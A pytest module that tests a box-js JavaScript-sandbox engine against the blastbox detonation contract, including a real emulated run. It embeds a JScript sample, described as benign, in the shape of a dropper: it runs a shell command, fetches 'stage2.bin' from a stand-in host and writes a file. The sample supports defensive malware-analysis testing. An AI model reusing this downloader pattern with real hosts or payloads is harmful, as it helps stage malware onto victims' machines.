"""BoxJsEngine against its engine contract (blastbox-engine.toml at the repo root).

The checker ships on blastbox's contract branch, so this module skips on a released
blastbox. The real-detonation tests also need node and an installed box-js checkout
(`git submodule update --init && (cd box-js && npm ci --omit=dev)`, or BOXJS_RUN_JS).
"""
from __future__ import annotations

import hashlib
import json
import os
import shutil
from pathlib import Path

import pytest

ec = pytest.importorskip("blastbox.contract.engine_contract")

from blastbox.limits import Limits

from boxjs_engine.engine import RUN_JS_ENV, BoxJsEngine

REPO = Path(__file__).resolve().parents[1]
CONTRACT_PATH = REPO / "blastbox-engine.toml"
CONTRACT = ec.load_contract(CONTRACT_PATH)

RUN_JS = Path(os.environ.get(RUN_JS_ENV) or REPO / "box-js" / "run.js")
REAL = (shutil.which("node") is not None and RUN_JS.is_file()
        and (RUN_JS.parent / "node_modules").is_dir())
needs_boxjs = pytest.mark.skipif(not REAL, reason="needs node + an installed box-js checkout")

# Benign: launches a command, fetches a URL (faked offline) and writes a file, which is the
# behaviour every artifact family and payload count is about.
SAMPLE = r'''
var sh = new ActiveXObject("WScript.Shell");
sh.Run("cmd /c echo contract", 0);
var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET", "http://example.invalid/stage2.bin", false);
x.send();
var f = new ActiveXObject("Scripting.FileSystemObject").CreateTextFile("C:\\Users\\Public\\a.txt", true);
f.WriteLine("dropped");
f.Close();
'''


def test_the_contract_validates():
    assert ec.find_contract(Path(__file__)) == CONTRACT_PATH
    assert ec.main(["validate", str(CONTRACT_PATH)]) == 0
    assert CONTRACT.engine.name == BoxJsEngine.name
    assert set(CONTRACT.engine.formats) == set(BoxJsEngine.formats)
    assert [c.mapper for c in CONTRACT.consumers if c.engine == "boxjs"] == [
        "backend/loadout/boxjs.py:map_outputs"]


def test_a_missing_box_js_is_an_engine_error_that_conforms(tmp_path, monkeypatch):
    monkeypatch.setenv(RUN_JS_ENV, str(tmp_path / "absent" / "run.js"))
    sample = tmp_path / "s.js"
    sample.write_text("var a = 1;")
    out = tmp_path / "out"
    out.mkdir()
    res = BoxJsEngine().detonate(sample, out, Limits())
    assert res.status == "engine_error"
    ec.assert_conforms(CONTRACT, res, out)


@needs_boxjs
def test_a_real_detonation_conforms(tmp_path, monkeypatch):
    monkeypatch.setenv(RUN_JS_ENV, str(RUN_JS))
    sample = tmp_path / "sample.js"
    sample.write_text(SAMPLE)
    out = tmp_path / "out"
    out.mkdir()
    res = BoxJsEngine().detonate(sample, out, Limits(timeout_s=60))
    assert res.status == "ok", res.payload.fields
    ec.assert_conforms(CONTRACT, res, out)
    ids = {a.id for a in res.artifacts}
    assert {"IOC.json", "urls.json"} <= ids
    assert any(a.kind == "dropped" for a in res.artifacts)
    assert res.payload.fields["exec_iocs"] >= 1 and res.payload.fields["url_count"] == 1


@needs_boxjs
def test_a_sealed_real_detonation_conforms(tmp_path, monkeypatch):
    """The harness's sealed metadata.json, as a worker ships it to the dispatcher."""
    from blastbox.worker.harness import run_detonation

    monkeypatch.setenv(RUN_JS_ENV, str(RUN_JS))
    sample = tmp_path / "sample.js"
    sample.write_text(SAMPLE)
    out = tmp_path / "out"
    assert run_detonation(BoxJsEngine(), input_path=sample, output_dir=out,
                          limits=Limits(timeout_s=60)) == 0
    meta = json.loads((out / "metadata.json").read_text())
    assert meta["status"] == "ok"
    assert meta["input_sha256"] == hashlib.sha256(sample.read_bytes()).hexdigest()
    ec.assert_conforms(CONTRACT, meta)
